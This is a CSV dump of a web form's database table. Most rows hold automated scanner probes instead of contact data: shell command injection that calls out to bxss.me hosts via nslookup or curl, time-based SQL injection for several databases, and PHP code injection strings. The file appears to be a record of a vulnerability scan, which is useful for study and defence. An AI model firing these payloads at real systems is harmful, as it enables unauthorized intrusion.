id,Title,linkren,phone,mobile,fax,email,content,date,address,state,statedate,prodid
7132,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,(nslookup -q=cname hitjbkgeaqrkx8229a.bxss.me||curl hitjbkgeaqrkx8229a.bxss.me)),testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7133,Mr.,prodMsg.asp/.,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7134,Mr.,HfjNUlYZ,${@print(md5(31337))}\,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7135,Mr.,HfjNUlYZ||sleep(27*1000)*zahiss||,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7136,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,$(nslookup -q=cname hitlannlaqayzf5f12.bxss.me||curl hitlannlaqayzf5f12.bxss.me),testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7137,Mr.,HfjNUlYZ,prodMsg.asp,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7138,Mr.,HfjNUlYZ,.print(md5(31337)).,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7139,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street83n9hoZj) OR 130=(SELECT 130 FROM PG_SLEEP(15))—,0,,0
7141,Mr.,HfjNUlYZ,prodMsg.asp,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7142,Mr.,HfjNUlYZ&quot;||sleep(27*1000)*bmtnke||&quot;,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7144,Mr.,HfjNUlYZ,prodMsg.asp/.,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7145,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,|(nslookup -q=cname hitftnoribmnv14d97.bxss.me||curl hitftnoribmnv14d97.bxss.me),testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7146,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7147,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,`(nslookup -q=cname hitjeihymygly6891a.bxss.me||curl hitjeihymygly6891a.bxss.me)`,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7148,Mr.,HfjNUlYZ,&quot;(),987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7150,Mr.,HfjNUlYZ,555-666-0606&amp;&amp;sleep(27*1000)*uwtbdc&amp;&amp;,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7151,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,|(nslookup${IFS}-q${IFS}cname${IFS}hitrlprrbdoczcd201.bxss.me||curl${IFS}hitrlprrbdoczcd201.bxss.me),testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7152,Mr.,HfjNUlYZ,555-666-0606&quot;&amp;&amp;sleep(27*1000)*zxtslp&amp;&amp;&quot;,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7154,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna StreetXxh4dr5Y)) OR 466=(SELECT 466 FROM PG_SLEEP(15))—,0,,0
7155,Mr.,HfjNUlYZ,555-666-0606||sleep(27*1000)*rwwtjk||,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7156,Mr.,HfjNUlYZ,555-666-0606&quot;||sleep(27*1000)*awpjlj||&quot;,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7158,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,"3137 Laguna Street||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||",0,,0
7159,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street&quot;,0,,0
7160,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street困愧%2527%2522\\&quot;,0,,0
7162,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,@@GJ4rL,0,,0
7164,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7166,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7168,Mr.,HfjNUlYZ,555-666-0606,(nslookup -q=cname hitizsybkvbgu68ced.bxss.me||curl hitizsybkvbgu68ced.bxss.me)),317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7169,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555nntIqdYa,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7170,Mr.,HfjNUlYZ,555-666-0606,$(nslookup -q=cname hitbxnmrwonceacbb6.bxss.me||curl hitbxnmrwonceacbb6.bxss.me),317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7171,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7173,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,-1 OR 2+347-347-1=0+0+0+1  ,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7175,Mr.,HfjNUlYZ,555-666-0606,|(nslookup -q=cname hitnhkjbxyauia679b.bxss.me||curl hitnhkjbxyauia679b.bxss.me),317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7176,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,-1 OR 2+637-637-1=0+0+0+1,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7177,Mr.,HfjNUlYZ,555-666-0606,`(nslookup -q=cname hitccnvryholkfcf8a.bxss.me||curl hitccnvryholkfcf8a.bxss.me)`,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7178,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,-1 OR 2+705-705-1=0+0+0+1  ,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7179,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,-1 OR 2+372-372-1=0+0+0+1 or H9wr8Rfx=,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7181,Mr.,HfjNUlYZ,555-666-0606,|(nslookup${IFS}-q${IFS}cname${IFS}hitajomqjlwhge7773.bxss.me||curl${IFS}hitajomqjlwhge7773.bxss.me),317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7182,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,-1&quot; OR 2+813-813-1=0+0+0+1  ,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7185,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,"555*if(now()=sysdate(),sleep(15),0)",2025-11-11 00:00:00,3137 Laguna Street,0,,0
7190,Mr.,(nslookup -q=cname hithwzjkeipfc96dde.bxss.me||curl hithwzjkeipfc96dde.bxss.me)),555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7191,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,"5550XOR(555*if(now()=sysdate(),sleep(15),0))XORZ",2025-11-11 00:00:00,3137 Laguna Street,0,,0
7192,Mr.,$(nslookup -q=cname hitootusmuhzh1dab7.bxss.me||curl hitootusmuhzh1dab7.bxss.me),555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7195,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,"5550&quot;XOR(555*if(now()=sysdate(),sleep(15),0))XOR&quot;Z",2025-11-11 00:00:00,3137 Laguna Street,0,,0
7196,Mr.,|(nslookup -q=cname hitmcpvnynyew6287d.bxss.me||curl hitmcpvnynyew6287d.bxss.me),555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7197,Mr.,`(nslookup -q=cname hitascebpumltf7ea9.bxss.me||curl hitascebpumltf7ea9.bxss.me)`,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7198,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,(select(0)from(select(sleep(15)))v)/*+(select(0)from(select(sleep(15)))v)+&quot;+(select(0)from(select(sleep(15)))v)+&quot;*/,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7200,Mr.,|(nslookup${IFS}-q${IFS}cname${IFS}hitmafjbqxwox54422.bxss.me||curl${IFS}hitmafjbqxwox54422.bxss.me),555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7203,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555-1ÿ waitfor delay 0:0:15  ,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7206,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555-1)ÿ waitfor delay 0:0:15  ,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7209,Mr.,HfjNUlYZ,(nslookup -q=cname hitdilbnsjzfub0b12.bxss.me||curl hitdilbnsjzfub0b12.bxss.me)),987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7210,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555-1))ÿ waitfor delay 0:0:15  ,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7211,Mr.,HfjNUlYZ,$(nslookup -q=cname hitvwxidxyhww40303.bxss.me||curl hitvwxidxyhww40303.bxss.me),987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7214,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555-1 waitfor delay 0:0:15  ,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7215,Mr.,HfjNUlYZ,|(nslookup -q=cname hitatgpkckfck6bdc2.bxss.me||curl hitatgpkckfck6bdc2.bxss.me),987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7216,Mr.,HfjNUlYZ,`(nslookup -q=cname hityfvuahfkvqf1427.bxss.me||curl hityfvuahfkvqf1427.bxss.me)`,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7217,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555pT9xcNHSÿ waitfor delay 0:0:15  ,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7219,Mr.,HfjNUlYZ,|(nslookup${IFS}-q${IFS}cname${IFS}hitacatepdvyicaef7.bxss.me||curl${IFS}hitacatepdvyicaef7.bxss.me),987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7221,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555RVklIZag)ÿ waitfor delay 0:0:15  ,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7222,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555gsHml6fs))ÿ waitfor delay 0:0:15  ,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7223,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555-1 OR 480=(SELECT 480 FROM PG_SLEEP(15)) ,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7224,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555-1) OR 127=(SELECT 127 FROM PG_SLEEP(15)) ,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7225,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555-1)) OR 747=(SELECT 747 FROM PG_SLEEP(15)) ,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7226,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555jMPmMCnR OR 650=(SELECT 650 FROM PG_SLEEP(15)) ,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7227,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555pGJgXxNx) OR 958=(SELECT 958 FROM PG_SLEEP(15)) ,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7228,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555qPqwR74f)) OR 487=(SELECT 487 FROM PG_SLEEP(15)) ,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7229,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,"555*DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(99)||CHR(99),15)",2025-11-11 00:00:00,3137 Laguna Street,0,,0
7230,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,"555||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||",2025-11-11 00:00:00,3137 Laguna Street,0,,0
7231,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555&quot;,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7232,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555ðV'a%2527%2522\\&quot;,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7233,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,@@C3QAr,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7234,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7235,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7236,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com2syHFJpf,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7237,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7238,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,-1 OR 2+870-870-1=0+0+0+1  ,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7239,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,-1 OR 2+459-459-1=0+0+0+1,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7240,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,-1 OR 2+256-256-1=0+0+0+1  ,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7241,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,-1 OR 2+73-73-1=0+0+0+1 or LWjxtXem=,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7242,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,-1&quot; OR 2+193-193-1=0+0+0+1  ,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7243,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,"if(now()=sysdate(),sleep(15),0)",555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7244,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,"testing@example.com0XOR(if(now()=sysdate(),sleep(15),0))XORZ",555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7245,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,"testing@example.com0&quot;XOR(if(now()=sysdate(),sleep(15),0))XOR&quot;Z",555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7247,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com-1ÿ waitfor delay 0:0:15  ,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7248,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com-1)ÿ waitfor delay 0:0:15  ,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7249,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com-1 waitfor delay 0:0:15  ,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7250,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com6oqpe5Ysÿ waitfor delay 0:0:15  ,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7251,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.comldK3DuGs)ÿ waitfor delay 0:0:15  ,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7252,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.comhvm5bbP9))ÿ waitfor delay 0:0:15  ,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7253,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.comFHmpicld OR 784=(SELECT 784 FROM PG_SLEEP(15)) ,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7254,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.comZSKcCQQc) OR 133=(SELECT 133 FROM PG_SLEEP(15)) ,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7255,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.comDIaXho4I)) OR 362=(SELECT 362 FROM PG_SLEEP(15)) ,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7256,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,"testing@example.com||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||",555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7257,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com&quot;,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7258,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.comðV'a%2527%2522\\&quot;,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7259,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,@@AbjuO,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7260,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7261,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7262,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137GYxk7ual,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7263,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7264,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,-1 OR 2+117-117-1=0+0+0+1  ,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7265,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,-1 OR 2+746-746-1=0+0+0+1,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7266,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,-1 OR 2+366-366-1=0+0+0+1  ,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7267,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,-1 OR 2+525-525-1=0+0+0+1 or mcASnOen=,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7268,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,-1&quot; OR 2+769-769-1=0+0+0+1  ,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7269,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,"if(now()=sysdate(),sleep(15),0)",testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7270,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,"317-317-31370XOR(if(now()=sysdate(),sleep(15),0))XORZ",testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7271,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,"317-317-31370&quot;XOR(if(now()=sysdate(),sleep(15),0))XOR&quot;Z",testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7273,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137-1ÿ waitfor delay 0:0:15  ,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7274,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137-1)ÿ waitfor delay 0:0:15  ,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7275,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137-1 waitfor delay 0:0:15  ,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7276,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137UmQEIO7Oÿ waitfor delay 0:0:15  ,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7277,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137YiQUxHBp)ÿ waitfor delay 0:0:15  ,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7278,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137eT9LaSJT))ÿ waitfor delay 0:0:15  ,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7279,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137T4BvWatG OR 593=(SELECT 593 FROM PG_SLEEP(15)) ,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7280,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137jeJZS5fa) OR 489=(SELECT 489 FROM PG_SLEEP(15)) ,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7281,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137rWuWTloZ)) OR 438=(SELECT 438 FROM PG_SLEEP(15)) ,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7282,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,"317-317-3137||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||",testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7283,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137&quot;,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7284,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137ðV'a%2527%2522\\&quot;,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7285,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,@@GfMfO,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7286,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7287,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7288,Mr.,HfjNUlYZ,555-666-0606,987-65-4329Ubddhht5,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7289,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7290,Mr.,HfjNUlYZ,555-666-0606,-1 OR 2+92-92-1=0+0+0+1  ,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7291,Mr.,HfjNUlYZ,555-666-0606,-1 OR 2+249-249-1=0+0+0+1,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7292,Mr.,HfjNUlYZ,555-666-0606,-1 OR 2+27-27-1=0+0+0+1  ,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7293,Mr.,HfjNUlYZ,555-666-0606,-1 OR 2+43-43-1=0+0+0+1 or 4iHkaC2d=,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7294,Mr.,HfjNUlYZ,555-666-0606,-1&quot; OR 2+332-332-1=0+0+0+1  ,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7295,Mr.,HfjNUlYZ,555-666-0606,"if(now()=sysdate(),sleep(15),0)",317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7296,Mr.,HfjNUlYZ,555-666-0606,"987-65-43290XOR(if(now()=sysdate(),sleep(15),0))XORZ",317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7297,Mr.,HfjNUlYZ,555-666-0606,"987-65-43290&quot;XOR(if(now()=sysdate(),sleep(15),0))XOR&quot;Z",317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7299,Mr.,HfjNUlYZ,555-666-0606,987-65-4329-1ÿ waitfor delay 0:0:15  ,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7300,Mr.,HfjNUlYZ,555-666-0606,987-65-4329-1)ÿ waitfor delay 0:0:15  ,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7301,Mr.,HfjNUlYZ,555-666-0606,987-65-4329-1 waitfor delay 0:0:15  ,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7302,Mr.,HfjNUlYZ,555-666-0606,987-65-4329b7lomQ8qÿ waitfor delay 0:0:15  ,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7303,Mr.,HfjNUlYZ,555-666-0606,987-65-4329VnSuF1D2)ÿ waitfor delay 0:0:15  ,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7304,Mr.,HfjNUlYZ,555-666-0606,987-65-4329kJ1AGxtJ))ÿ waitfor delay 0:0:15  ,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
